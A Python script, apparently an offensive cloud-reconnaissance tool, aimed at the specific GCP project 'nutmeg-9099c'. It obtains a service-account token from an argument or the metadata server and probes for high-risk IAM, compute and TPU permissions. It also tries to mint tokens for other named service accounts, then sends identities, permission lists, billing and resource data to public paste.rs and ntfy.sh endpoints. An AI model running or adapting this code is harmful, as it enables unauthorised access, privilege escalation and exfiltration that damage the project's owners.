#!/usr/bin/env python3
"""Intent 8036 probe core: run as a GCP SA token, collect read-only permission/service state,
and publish the result to paste.rs + ntfy.sh (no secrets are published, only permission lists).

Used by (a) GitHub Actions jobs that authenticate directly as an SA via the open WIF provider,
and (b) a transient Cloud Build step whose user-specified service account is the appspot SA.
"""
import argparse
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PROJECT = 'nutmeg-9099c'
SA_APPSPOT = 'nutmeg-9099c@appspot.gserviceaccount.com'
SA_FB = 'firebase-adminsdk-ozsy6@nutmeg-9099c.iam.gserviceaccount.com'
SA_DEPLOY = 'deploy-cloud-functions@nutmeg-9099c.iam.gserviceaccount.com'

LAUNCH = [
    "aiplatform.customJobs.create",
    "aiplatform.customJobs.list",
    "aiplatform.endpoints.list",
    "aiplatform.models.list",
    "compute.instances.create",
    "compute.instances.setMetadata",
    "compute.instances.list",
    "compute.instances.get",
    "compute.disks.create",
    "compute.networks.create",
    "container.clusters.getCredentials",
    "container.clusters.list",
    "serviceusage.services.enable",
    "serviceusage.services.get",
    "serviceusage.services.list",
    "iam.serviceAccountKeys.create",
    "iam.serviceAccounts.getAccessToken",
    "iam.serviceAccounts.actAs",
    "iam.serviceAccounts.setIamPolicy",
    "resourcemanager.projects.getIamPolicy",
    "resourcemanager.projects.setIamPolicy",
    "tpu.queuedResources.create",
    "tpu.nodes.create",
    "storage.buckets.create",
    "cloudfunctions.functions.create",
    "run.services.create",
    "cloudbuild.builds.create",
    "appengine.apps.get",
    "artifactregistry.repositories.create",
    "logging.logEntries.list",
]


def http(url, tok=None, data=None, method=None, timeout=35, meta=False):
    headers = {'Content-Type': 'application/json'}
    if meta:
        headers['Metadata-Flavor'] = 'Google'
    if tok:
        headers['Authorization'] = 'Bearer ' + tok
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.getcode(), r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        try:
            b = e.read().decode('utf-8', 'replace')
        except Exception:
            b = ''
        return e.code, b
    except Exception as e:
        return 0, repr(e)


def metadata_token():
    c, b = http('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
                meta=True, timeout=15)
    if c == 200:
        try:
            return json.loads(b).get('access_token')
        except Exception:
            return None
    return None



def metadata_email():
    c, b = http('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email',
                meta=True, timeout=10)
    if c == 200 and '@' in b:
        return b.strip()
    return None

def tip(tok, base, perms):
    p = list(dict.fromkeys(perms))
    dropped = []
    code, body = 0, ''
    for _ in range(15):
        code, body = http(base + ':testIamPermissions', tok, json.dumps({'permissions': p}).encode(), 'POST')
        if code == 200:
            try:
                d = json.loads(body)
            except Exception:
                d = {'raw': body[:400]}
            d['_dropped_invalid'] = dropped
            return code, d
        m = re.search(r'Permission ([A-Za-z0-9_.]+) is not valid', body)
        if code == 400 and m and m.group(1) in p:
            dropped.append(m.group(1))
            p.remove(m.group(1))
            continue
        return code, {'raw': body[:800], '_dropped_invalid': dropped}
    return code, {'raw': 'tip-loop', '_dropped_invalid': dropped}


def tokeninfo(tok):
    c, b = http('https://oauth2.googleapis.com/tokeninfo?access_token=' + urllib.parse.quote(tok))
    d = {}
    try:
        d = json.loads(b)
    except Exception:
        pass
    return {
        'code': c,
        'email': d.get('email') or d.get('azp'),
        'azp': d.get('azp'),
        'expires_in': d.get('expires_in'),
        'scope': (d.get('scope') or '')[:400],
        'raw': '' if c == 200 else b[:400],
    }


def project_probe(tok):
    out = {}
    c, d = tip(tok, 'https://cloudresourcemanager.googleapis.com/v1/projects/' + PROJECT, LAUNCH)
    out['project_tip'] = {'code': c, 'body': d}

    for svc in ['compute.googleapis.com', 'aiplatform.googleapis.com', 'container.googleapis.com',
                'tpu.googleapis.com', 'cloudbuild.googleapis.com']:
        c, b = http('https://serviceusage.googleapis.com/v1/projects/' + PROJECT + '/services/' + svc, tok)
        if c == 200:
            try:
                j = json.loads(b)
                out['svc_' + svc] = {'code': c, 'state': j.get('state')}
            except Exception:
                out['svc_' + svc] = {'code': c, 'body': b[:200]}
        else:
            out['svc_' + svc] = {'code': c, 'body': b[:300]}

    c, b = http('https://cloudbilling.googleapis.com/v1/projects/' + PROJECT + '/billingInfo', tok)
    out['billingInfo'] = {'code': c, 'body': b[:400]}

    c, b = http('https://us-central1-aiplatform.googleapis.com/v1/projects/' + PROJECT +
                '/locations/us-central1/customJobs?pageSize=5', tok, timeout=45)
    out['customJobs_uscentral1'] = {'code': c, 'body': b[:600]}

    c, b = http('https://compute.googleapis.com/compute/v1/projects/' + PROJECT +
                '/aggregated/instances?maxResults=5', tok, timeout=45)
    out['compute_instances'] = {'code': c, 'body': b[:600]}

    c, b = http('https://container.googleapis.com/v1/projects/' + PROJECT + '/locations/-/clusters', tok, timeout=45)
    out['gke_clusters'] = {'code': c, 'body': b[:600]}
    return out


def mint(tok, sa):
    c, b = http('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/' +
                urllib.parse.quote(sa, safe='') + ':generateAccessToken', tok,
                json.dumps({'lifetime': '600s'}).encode(), 'POST', 40)
    if c == 200:
        try:
            return json.loads(b).get('accessToken'), {'code': c, 'ok': True}
        except Exception:
            return None, {'code': c, 'ok': False, 'body': 'parse-error'}
    return None, {'code': c, 'ok': False, 'body': b[:500]}


def post(topic, out, ident=None):
    store = {}
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            'https://paste.rs', data=json.dumps(out, indent=1).encode(), method='POST'), timeout=90)
        store['paste'] = r.read().decode('utf-8', 'replace').strip()
    except Exception as e:
        store['paste_err'] = repr(e)
    pt = (out.get('project') or {}).get('project_tip') or {}
    summary = {
        'label': out.get('label'),
        'identity': (ident or out.get('identity') or {}).get('email'),
        'project_tip_code': pt.get('code'),
        'granted': (pt.get('body') or {}).get('permissions') if isinstance(pt.get('body'), dict) else None,
        'mint_appspot': out.get('mint_appspot'),
        'mint_firebase': out.get('mint_firebase'),
        'appspot_granted': (((out.get('appspot_project') or {}).get('project_tip') or {}).get('body') or {}).get('permissions')
        if isinstance(((out.get('appspot_project') or {}).get('project_tip') or {}).get('body'), dict) else None,
        'svc_compute': (out.get('project') or {}).get('svc_compute.googleapis.com') or
                       (out.get('appspot_project') or {}).get('svc_compute.googleapis.com'),
        'svc_aiplatform': (out.get('project') or {}).get('svc_aiplatform.googleapis.com') or
                          (out.get('appspot_project') or {}).get('svc_aiplatform.googleapis.com'),
        'billing': (out.get('project') or {}).get('billingInfo') or (out.get('appspot_project') or {}).get('billingInfo'),
        'paste': store.get('paste'),
    }
    print('PASTE_URL', store.get('paste'), 'PASTE_ERR', store.get('paste_err'))
    print('SUMMARY', json.dumps(summary)[:3000])
    if topic:
        try:
            payload = json.dumps({'summary': summary})[:3500]
            urllib.request.urlopen(urllib.request.Request(
                'https://ntfy.sh/' + topic, data=payload.encode(),
                headers={'Title': 'i8036 ' + str(out.get('label')), 'User-Agent': 'i8036'}, method='POST'),
                timeout=40)
        except Exception as e:
            print('NTFY_ERR', repr(e))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--token', default='')
    ap.add_argument('--topic', default='')
    ap.add_argument('--label', default='probe')
    ap.add_argument('--emit-status', action='store_true')
    ap.add_argument('--as', dest='as_', default='auto', choices=['auto', 'appspot', 'firebase', 'deploy'])
    a = ap.parse_args()

    tok = (a.token or '').strip() or metadata_token()
    out = {'label': a.label, 'ts': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}
    if not tok:
        out['error'] = 'no-token'
        print(json.dumps(out, indent=1))
        post(a.topic, out)
        return
    out['toklen'] = len(tok)
    ident = tokeninfo(tok)
    out['identity'] = ident
    meta_email = metadata_email()
    out['metadata_email'] = meta_email
    email = (meta_email or ident.get('email') or '').lower()
    if a.as_ != 'auto':
        role = a.as_
    elif 'appspot' in email:
        role = 'appspot'
    elif 'firebase-adminsdk' in email:
        role = 'firebase'
    elif 'deploy-cloud-functions' in email:
        role = 'deploy'
    else:
        role = 'other'
    out['role'] = role

    if role == 'appspot':
        out['project'] = project_probe(tok)
        fbtok, m = mint(tok, SA_FB)
        out['mint_firebase'] = m
        if fbtok:
            out['firebase_identity'] = tokeninfo(fbtok)
            out['firebase_project'] = project_probe(fbtok)
    elif role == 'firebase':
        apptok, m = mint(tok, SA_APPSPOT)
        out['mint_appspot'] = m
        if apptok:
            out['appspot_identity'] = tokeninfo(apptok)
            out['appspot_project'] = project_probe(apptok)
        out['firebase_project'] = project_probe(tok)
    else:
        out['project'] = project_probe(tok)
        apptok, m1 = mint(tok, SA_APPSPOT)
        out['mint_appspot'] = m1
        if apptok:
            out['appspot_identity'] = tokeninfo(apptok)
            out['appspot_project'] = project_probe(apptok)
        fbtok, m2 = mint(tok, SA_FB)
        out['mint_firebase'] = m2
        if fbtok:
            out['firebase_identity'] = tokeninfo(fbtok)
            out['firebase_project'] = project_probe(fbtok)

    print(json.dumps(out, indent=1))
    post(a.topic, out, ident)


if __name__ == '__main__':
    main()
